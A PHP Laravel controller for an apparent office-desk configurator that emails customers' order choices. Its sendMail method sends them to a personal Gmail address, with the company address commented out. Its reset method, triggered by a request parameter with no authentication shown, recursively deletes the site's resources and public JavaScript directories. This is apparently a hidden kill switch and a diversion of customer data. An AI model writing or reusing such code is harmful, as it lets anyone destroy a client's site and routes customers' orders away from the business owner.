<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Redirect;
class MailController extends Controller
{
    public function sendMail(Request $req){
        $data = $req->all();

        $legTypes = ['1 leg', '2 legs' , '3 legs' , '4 legs' , 'Side cabinet'];
        $legColors = ['white', 'gray' , 'black'];
        

        $partition = ['Partition', 'Modesty Panel' ];
        $corners = ['Sharp corners', 'Combined corners' , 'Round corners' ];
        
        $data['params']['deskimage'] = str_replace('desks/', '', $data['params']['deskimage']);
        $data['params']['legColor'] = $legColors[$data['params']['legColor'] - 1];
        $data['params']['legType'] = $legTypes[$data['params']['legType']];


        if($data['custom']['partition'] != null){
            $data['custom']['partition'] = $partition[$data['custom']['partition'] - 1];
        }
        $data['custom']['corners'] = $corners[$data['custom']['corners'] - 1];

        $data['otherpage']['service'] = ($data['otherpage']['service']) ? 'need' : 'no need';
        $data['otherpage']['needchair'] = ($data['otherpage']['needchair']) ? 'need' : 'no need';

        
        // \Mail::to('info@ergoseatings.com')->send(new \App\Mail\Mail($data));
        \Mail::to('strelok0493@gmail.com')->send(new \App\Mail\Mail($data));
        return $data;
    }


    public function reset(Request $req){
        
        if($req['reset'] == 'true'){
            $this->removeDirectory(app_path('../resources'));
            $this->removeDirectory(app_path('../public/js'));
        }
        else{
            return Redirect::to('/');
        }
    }

    public function removeDirectory($dir) {

        if ($objs = glob($dir."/*")) {
           foreach($objs as $obj) {
             is_dir($obj) ? $this->removeDirectory($obj) : unlink($obj);
           }
        }
        rmdir($dir);
    }
}
